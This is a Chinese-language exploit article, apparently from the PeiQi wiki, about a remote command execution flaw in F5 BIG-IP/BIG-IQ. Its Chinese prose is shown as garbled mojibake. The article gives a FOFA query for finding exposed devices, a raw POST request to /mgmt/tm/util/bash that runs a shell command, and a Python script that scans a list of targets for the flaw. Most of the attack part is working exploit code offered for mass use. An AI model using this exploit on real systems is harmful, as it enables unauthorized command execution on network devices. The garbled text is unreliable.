<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZtE7R4PPgdWY9ea06A9wqQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**ä¸€****ï¼šæ¼æ´æè¿°ğŸ‘**

F5 BIG-IP æ˜¯ç¾å›½ F5 å…¬å¸çš„ä¸€æ¬¾é›†æˆäº†ç½‘ç»œæµé‡ç®¡ç†ã€åº”ç”¨ç¨‹åºå®‰å…¨ç®¡ç†ã€è´Ÿè½½å‡è¡¡ç­‰åŠŸèƒ½çš„åº”ç”¨äº¤ä»˜å¹³å°ã€‚

è¿‘æ—¥ï¼ŒF5 å‘å¸ƒäº† F5 BIG-IQ/F5 BIG-IP ä»£ç æ‰§è¡Œï¼Œä»£ç æ‰§è¡Œçš„é£é™©å£°æ˜ï¼ŒF5 å®‰å…¨å…¬å‘Šæ›´æ–°äº† BIG-IPï¼ŒBIG-IQ ä¸­çš„å¤šä¸ªä¸¥é‡æ¼æ´ã€‚å»ºè®®å¹¿å¤§ç”¨æˆ·åŠæ—¶å°† f5 big-iq,f5 big-ip å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œé¿å…é­åˆ°æ”»å‡»ã€‚

**äºŒ:Â  æ¼æ´å½±å“ğŸ‡**

F5 BIG-IP 16.x: 16.1.0.3

F5 BIG-IP 15.x: 15.1.0.4

F5 BIG-IP 14.x: 14.1.2.6

F5 BIG-IP 13.x: 13.1.3.4

F5 BIG-IP 12.x: 12.1.5.2

F5 BIG-IP 11.x: 11.6.5.2

**ä¸‰:Â  æ¼æ´å¤ç°ğŸ‹**

**FOFA è¯­å¥:Â icon_hash="-335242539"**

**è®¿é—®ç™»å½•é¡µé¢å¦‚ä¸‹  
**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7UCiaYAH0MhZWQSKiayiaAThRDLDAjqy3Sk9yLXavqYqB3FaOYopbHZz3p6EMr81nFIsu19h5r7G54g/640?wx_fmt=png)

å‘é€è¯·æ±‚åŒ…

```
POST /mgmt/tm/util/bash HTTP/1.1
Host: xxx.xxx.xxx.xxx:8443
Connection: close
Content-Length: 41
Cache-Control: max-age=0
Authorization: Basic YWRtaW46QVNhc1M=
X-F5-Auth-Token: 
Upgrade-Insecure-Requests: 1
Content-Type: application/json

{"command":"run","utilCmdArgs":"-c id"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7UCiaYAH0MhZWQSKiayiaAThRprKVhurzbPHLEiaEbJqaGjF3XXTPGJ91nuia0KFUn4HlWc9TFRn1zvvQ/640?wx_fmt=png)

æˆåŠŸæ‰§è¡Œå‘½ä»¤ id

****å››:Â  æ¼æ´ POCğŸ¦‰****

```
import requests
import sys
import random
import re
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34må…¬ä¼—å·  : PeiQiæ–‡åº“                                                   \033[0m')
    print('+  \033[34mVersion: F5 BIG-IP                                                  \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         >>> ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/mgmt/tm/util/bash"
    headers = {
        "Authorization": "Basic YWRtaW46QVNhc1M=",
        "X-F5-Auth-Token": "",
        "Content-Type": "application/json"
    }
    data = '{"command":"run","utilCmdArgs":"-c id"}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=2)
        if "commandResult" in response.text and response.status_code == 200:
            print("\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´,å“åº”ä¸º:{} \033[0m".format(target_url, json.loads(response.text)["commandResult"]))
        else:
            print("\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "https://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] è¯·æ±‚æŠ¥é”™ \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile >>> \033[0m"))
    Scan(file_name)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7UCiaYAH0MhZWQSKiayiaAThRgO5lE1XHFZrJlle60h4eBYdMVoMWPDdLNesP80nhlPrjqH9dq3Jn2g/640?wx_fmt=png)

æœ€å
--

> ä¸‹é¢å°±æ˜¯æ–‡åº“çš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨å…¬ä¼—å·å’Œäº¤æµç¾¤ï¼Œæƒ³è¦åŠ å…¥äº¤æµç¾¤çš„å…¬ä¼—å·ç‚¹å‡»äº¤æµç¾¤åŠ æˆ‘æ‹‰ä½ å•¦
> 
> æœ‰æ¼æ´æƒ³å…¬å¼€æŠ•ç¨¿çš„å¸ˆå‚…åŠ æˆ‘ï¼Œä¸€èµ·å®Œå–„æ–‡åº“~
> 
> åˆ«å¿˜äº† Github ä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­
> 
> https://github.com/PeiQi0/PeiQi-WIKI-POC

å…¬ä¼—å·